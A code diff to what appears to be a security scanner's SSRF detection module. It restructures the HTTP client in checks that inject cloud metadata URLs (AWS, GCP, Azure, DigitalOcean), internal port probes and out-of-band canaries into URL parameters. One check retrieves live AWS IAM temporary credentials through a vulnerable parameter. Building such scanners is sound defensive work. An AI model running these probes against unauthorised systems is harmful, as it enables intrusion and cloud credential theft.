@@ -35,6 +35,7 @@ from .shared import (
     _looks_like_sane_url,
     _shannon_entropy,
     _replace_query_param,
+    get_transport,
 )
 
 _SSRF_PARAM_NAMES = ["url", "callback", "webhook", "next", "redirect", "target", "dest", "image", "src", "feed"]
@@ -67,37 +68,37 @@ async def check_ssrf_reflected(url: str) -> dict | None:
 
     existing_params = dict(parsed.params)
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text[:3000].lower()
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text[:3000].lower()
+        except httpx.HTTPError:
+            return None
 
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
+            for probe in _SSRF_INTERNAL_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
                     continue
-                for probe in _SSRF_INTERNAL_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    body = resp.text[:3000].lower()
-                    for sig in ("ami-id", "instance-id", "iam/security-credentials"):
-                        if sig in body and sig not in baseline_body:
-                            return {
-                                "vuln_type": "ssrf_reflected_cloud_metadata",
-                                "severity": "critical",
-                                "evidence": (
-                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
-                                    f"pointed at the cloud metadata endpoint and the response "
-                                    f"body contains {sig!r} (absent from the unmodified baseline "
-                                    f"response)."
-                                ),
-                            }
+                body = resp.text[:3000].lower()
+                for sig in ("ami-id", "instance-id", "iam/security-credentials"):
+                    if sig in body and sig not in baseline_body:
+                        return {
+                            "vuln_type": "ssrf_reflected_cloud_metadata",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{test_url}: server-side fetch of parameter '{param_name}' "
+                                f"pointed at the cloud metadata endpoint and the response "
+                                f"body contains {sig!r} (absent from the unmodified baseline "
+                                f"response)."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: SSRF check failed for %s: %s", url, exc)
     return None
@@ -140,16 +141,16 @@ async def check_ssrf_blind_oob(url: str, oob_domain: str, oob_proc, finding_tag:
     canary_host = f"{finding_tag}.{oob_domain}"
     tested_urls = []
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            for param_name in candidate_params:
-                test_params = dict(existing_params)
-                test_params[param_name] = f"http://{canary_host}/"
-                test_url = parsed.copy_with(params=test_params)
-                tested_urls.append(str(test_url))
-                try:
-                    await client.get(test_url)
-                except httpx.HTTPError:
-                    continue
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        for param_name in candidate_params:
+            test_params = dict(existing_params)
+            test_params[param_name] = f"http://{canary_host}/"
+            test_url = parsed.copy_with(params=test_params)
+            tested_urls.append(str(test_url))
+            try:
+                await client.get(test_url)
+            except httpx.HTTPError:
+                continue
     except httpx.HTTPError as exc:
         logger.info("detective: blind SSRF OOB probe failed for %s: %s", url, exc)
         return None
@@ -212,37 +213,37 @@ async def check_ssrf_internal_port_scan(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text[:3000]
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text[:3000]
+        except httpx.HTTPError:
+            return None
 
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
+            for probe_url, service in _SSRF_INTERNAL_PORT_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe_url
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
                     continue
-                for probe_url, service in _SSRF_INTERNAL_PORT_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe_url
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    body = resp.text[:3000]
-                    for banner in _SSRF_SERVICE_BANNERS[service]:
-                        if banner in body and banner not in baseline_body:
-                            return {
-                                "vuln_type": "ssrf_internal_service_fingerprinting",
-                                "severity": "high",
-                                "evidence": (
-                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
-                                    f"pointed at {probe_url} and the response body contains a "
-                                    f"{service} banner ({banner!r}, absent from baseline) - SSRF "
-                                    f"confirmed reachable to an internal {service} instance."
-                                ),
-                            }
+                body = resp.text[:3000]
+                for banner in _SSRF_SERVICE_BANNERS[service]:
+                    if banner in body and banner not in baseline_body:
+                        return {
+                            "vuln_type": "ssrf_internal_service_fingerprinting",
+                            "severity": "high",
+                            "evidence": (
+                                f"{test_url}: server-side fetch of parameter '{param_name}' "
+                                f"pointed at {probe_url} and the response body contains a "
+                                f"{service} banner ({banner!r}, absent from baseline) - SSRF "
+                                f"confirmed reachable to an internal {service} instance."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: SSRF internal port scan failed for %s: %s", url, exc)
     return None
@@ -266,36 +267,36 @@ async def check_ssrf_gcp_metadata(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text[:3000]
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text[:3000]
+        except httpx.HTTPError:
+            return None
 
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
-                    continue
-                test_params = dict(existing_params)
-                test_params[param_name] = "http://169.254.169.254/computeMetadata/v1/instance/hostname"
-                test_url = parsed.copy_with(params=test_params)
-                try:
-                    resp = await client.get(test_url)
-                except httpx.HTTPError:
-                    continue
-                body = resp.text[:3000]
-                if re.search(r"\.c\.[\w-]+\.internal", body) and body not in baseline_body:
-                    return {
-                        "vuln_type": "ssrf_gcp_metadata",
-                        "severity": "critical",
-                        "evidence": (
-                            f"{test_url}: server-side fetch of parameter '{param_name}' "
-                            f"pointed at the GCP metadata endpoint returned what looks like a "
-                            f"GCE internal hostname (absent from baseline) - SSRF reaching "
-                            f"GCP instance metadata, potentially including service account "
-                            f"tokens via a follow-up path."
-                        ),
-                    }
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
+            test_params = dict(existing_params)
+            test_params[param_name] = "http://169.254.169.254/computeMetadata/v1/instance/hostname"
+            test_url = parsed.copy_with(params=test_params)
+            try:
+                resp = await client.get(test_url)
+            except httpx.HTTPError:
+                continue
+            body = resp.text[:3000]
+            if re.search(r"\.c\.[\w-]+\.internal", body) and body not in baseline_body:
+                return {
+                    "vuln_type": "ssrf_gcp_metadata",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{test_url}: server-side fetch of parameter '{param_name}' "
+                        f"pointed at the GCP metadata endpoint returned what looks like a "
+                        f"GCE internal hostname (absent from baseline) - SSRF reaching "
+                        f"GCP instance metadata, potentially including service account "
+                        f"tokens via a follow-up path."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: GCP metadata SSRF check failed for %s: %s", url, exc)
     return None
@@ -314,37 +315,37 @@ async def check_ssrf_azure_metadata(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text[:3000]
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text[:3000]
+        except httpx.HTTPError:
+            return None
 
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
-                    continue
-                test_params = dict(existing_params)
-                test_params[param_name] = (
-                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-                )
-                test_url = parsed.copy_with(params=test_params)
-                try:
-                    resp = await client.get(test_url)
-                except httpx.HTTPError:
-                    continue
-                body = resp.text[:3000]
-                if '"compute"' in body and '"compute"' not in baseline_body:
-                    return {
-                        "vuln_type": "ssrf_azure_metadata",
-                        "severity": "critical",
-                        "evidence": (
-                            f"{test_url}: server-side fetch of parameter '{param_name}' "
-                            f"pointed at Azure's IMDS endpoint returned a response containing "
-                            f'\'"compute"\' (absent from baseline) - SSRF reaching Azure '
-                            f"instance metadata."
-                        ),
-                    }
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
+            test_params = dict(existing_params)
+            test_params[param_name] = (
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+            )
+            test_url = parsed.copy_with(params=test_params)
+            try:
+                resp = await client.get(test_url)
+            except httpx.HTTPError:
+                continue
+            body = resp.text[:3000]
+            if '"compute"' in body and '"compute"' not in baseline_body:
+                return {
+                    "vuln_type": "ssrf_azure_metadata",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{test_url}: server-side fetch of parameter '{param_name}' "
+                        f"pointed at Azure's IMDS endpoint returned a response containing "
+                        f'\'"compute"\' (absent from baseline) - SSRF reaching Azure '
+                        f"instance metadata."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: Azure metadata SSRF check failed for %s: %s", url, exc)
     return None
@@ -364,35 +365,35 @@ async def check_ssrf_digitalocean_metadata(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text[:3000]
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text[:3000]
+        except httpx.HTTPError:
+            return None
 
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
-                    continue
-                test_params = dict(existing_params)
-                test_params[param_name] = "http://169.254.169.254/metadata/v1.json"
-                test_url = parsed.copy_with(params=test_params)
-                try:
-                    resp = await client.get(test_url)
-                except httpx.HTTPError:
-                    continue
-                body = resp.text[:3000]
-                if '"droplet_id"' in body and '"droplet_id"' not in baseline_body:
-                    return {
-                        "vuln_type": "ssrf_digitalocean_metadata",
-                        "severity": "critical",
-                        "evidence": (
-                            f"{test_url}: server-side fetch of parameter '{param_name}' "
-                            f'pointed at DigitalOcean\'s metadata endpoint returned '
-                            f'\'"droplet_id"\' (absent from baseline) - SSRF reaching '
-                            f"DigitalOcean instance metadata."
-                        ),
-                    }
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
+            test_params = dict(existing_params)
+            test_params[param_name] = "http://169.254.169.254/metadata/v1.json"
+            test_url = parsed.copy_with(params=test_params)
+            try:
+                resp = await client.get(test_url)
+            except httpx.HTTPError:
+                continue
+            body = resp.text[:3000]
+            if '"droplet_id"' in body and '"droplet_id"' not in baseline_body:
+                return {
+                    "vuln_type": "ssrf_digitalocean_metadata",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{test_url}: server-side fetch of parameter '{param_name}' "
+                        f'pointed at DigitalOcean\'s metadata endpoint returned '
+                        f'\'"droplet_id"\' (absent from baseline) - SSRF reaching '
+                        f"DigitalOcean instance metadata."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: DigitalOcean metadata SSRF check failed for %s: %s", url, exc)
     return None
@@ -429,55 +430,55 @@ async def check_ssrf_metadata_credential_extraction(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            for param_name in _SSRF_PARAM_NAMES:
-                if param_name not in existing_params:
-                    continue
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        for param_name in _SSRF_PARAM_NAMES:
+            if param_name not in existing_params:
+                continue
 
-                role_name = None
-                for role_list_probe in _SSRF_IAM_ROLE_LIST_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = role_list_probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    candidate = resp.text.strip().splitlines()[0].strip() if resp.text.strip() else ""
-                    if candidate and re.fullmatch(r"[A-Za-z0-9_+=,.@-]{1,128}", candidate):
-                        role_name = candidate
-                        break
-                if not role_name:
-                    continue
-
-                cred_probe = (
-                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
-                )
+            role_name = None
+            for role_list_probe in _SSRF_IAM_ROLE_LIST_PROBES:
                 test_params = dict(existing_params)
-                test_params[param_name] = cred_probe
+                test_params[param_name] = role_list_probe
                 test_url = parsed.copy_with(params=test_params)
                 try:
-                    cred_resp = await client.get(test_url)
+                    resp = await client.get(test_url)
                 except httpx.HTTPError:
                     continue
-                try:
-                    cred_data = cred_resp.json()
-                except ValueError:
-                    continue
-                if all(k in cred_data for k in _AWS_CRED_JSON_KEYS):
-                    key_preview = str(cred_data["AccessKeyId"])[:8] + "…"
-                    return {
-                        "vuln_type": "ssrf_metadata_iam_credential_extraction",
-                        "severity": "critical",
-                        "evidence": (
-                            f"{test_url}: chased the confirmed SSRF two hops - listed IAM role "
-                            f"{role_name!r} via the metadata service, then retrieved that role's "
-                            f"live temporary AWS credentials (AccessKeyId {key_preview}, plus a "
-                            f"SecretAccessKey and session Token) through the same vulnerable "
-                            f"parameter. Full cloud credential exfiltration confirmed, not just "
-                            f"metadata-service reachability."
-                        ),
-                    }
+                candidate = resp.text.strip().splitlines()[0].strip() if resp.text.strip() else ""
+                if candidate and re.fullmatch(r"[A-Za-z0-9_+=,.@-]{1,128}", candidate):
+                    role_name = candidate
+                    break
+            if not role_name:
+                continue
+
+            cred_probe = (
+                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+            )
+            test_params = dict(existing_params)
+            test_params[param_name] = cred_probe
+            test_url = parsed.copy_with(params=test_params)
+            try:
+                cred_resp = await client.get(test_url)
+            except httpx.HTTPError:
+                continue
+            try:
+                cred_data = cred_resp.json()
+            except ValueError:
+                continue
+            if all(k in cred_data for k in _AWS_CRED_JSON_KEYS):
+                key_preview = str(cred_data["AccessKeyId"])[:8] + "…"
+                return {
+                    "vuln_type": "ssrf_metadata_iam_credential_extraction",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{test_url}: chased the confirmed SSRF two hops - listed IAM role "
+                        f"{role_name!r} via the metadata service, then retrieved that role's "
+                        f"live temporary AWS credentials (AccessKeyId {key_preview}, plus a "
+                        f"SecretAccessKey and session Token) through the same vulnerable "
+                        f"parameter. Full cloud credential exfiltration confirmed, not just "
+                        f"metadata-service reachability."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: SSRF metadata credential extraction check failed for %s: %s", url, exc)
     return None
